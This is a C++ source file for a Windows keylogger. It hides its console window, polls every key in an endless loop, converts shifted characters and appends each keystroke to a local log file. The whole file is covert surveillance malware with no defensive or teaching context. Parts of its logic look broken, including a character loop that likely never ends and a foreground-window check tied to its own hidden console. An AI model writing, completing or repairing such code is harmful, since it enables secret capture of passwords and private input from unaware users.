#include "../imports.h"
#include <iostream>
#include <fstream>

// Function to hide console window
void hideConsoleWindow() {
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
}

int main() {
    // Hide console window
    hideConsoleWindow();

    // Get handle to the console window
    HWND hwnd = GetForegroundWindow();

    // Open a file to write the keystrokes
    std::ofstream logfile("keylog.txt");

    // Infinite loop to capture keystrokes
    while (true) {
        // Check if the current window is active
        if (GetForegroundWindow() == hwnd) {
            // Loop through each ASCII character
            for (char c = 8; c <= 255; c++) {
                // Check if key is pressed
                if (GetAsyncKeyState(c) == -32767) {
                    // Check if the key is an alphabetic character
                    if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z')) {
                        // Check if the key is uppercase
                        bool isUpperCase = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
                        if (!isUpperCase) {
                            // Convert to lowercase if the key is not uppercase
                            c = tolower(c);
                        }
                    }
                    // Handle special cases for symbols generated by Shift key
                    if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
                        switch (c) {
                            case '1': c = '!'; break;
                            case '2': c = '@'; break;
                            case '3': c = '#'; break;
                            case '4': c = '$'; break;
                            case '5': c = '%'; break;
                            case '6': c = '^'; break;
                            case '7': c = '&'; break;
                            case '8': c = '*'; break;
                            case '9': c = '('; break;
                            case '0': c = ')'; break;
                            case '-': c = '_'; break;
                            case '=': c = '+'; break;
                            case '[': c = '{'; break;
                            case ']': c = '}'; break;
                            case '\\': c = '|'; break;
                            case ';': c = ':'; break;
                            case '\'': c = '"'; break;
                            case ',': c = '<'; break;
                            case '.': c = '>'; break;
                            case '/': c = '?'; break;
                            // Handle other cases similarly
                        }
                    }
                    // Write the pressed key to the log file
                    if (c == '\r') {
                        logfile << std::endl;
                    } else {
                        logfile << c;
                    }
                    // Flush the output buffer to ensure immediate writing to the file
                    logfile.flush();
                }
            }
        }

        // Sleep for a short duration to avoid high CPU usage
        Sleep(10);
    }

    // Close the log file
    logfile.close();

    return 0;
}
